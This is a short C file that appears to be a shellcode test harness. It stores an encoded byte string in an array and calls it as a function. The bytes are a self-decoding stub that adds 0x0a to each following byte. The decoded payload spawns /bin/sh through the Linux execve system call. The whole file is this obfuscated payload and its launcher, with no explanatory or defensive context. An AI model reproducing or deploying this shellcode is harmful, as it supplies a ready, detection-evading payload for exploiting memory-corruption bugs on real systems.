#include <stdio.h>
#include <string.h>
unsigned char code[] = \
"\xeb\x0c\x5e\x80\x06\x0a\x46\x80\x3e\x0a\x74\x07\xeb\xf5\xe8\xef\xff\xff\xff\x27\xb6\x46\x5e\x64\x25\x69\x5e\x5e\x25\x25\x58\x5f\x7f\xd9\x46\x7f\xd8\x49\x7f\xd7\xa6\x01\xc3\x76\x0a";
int main()
{
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}
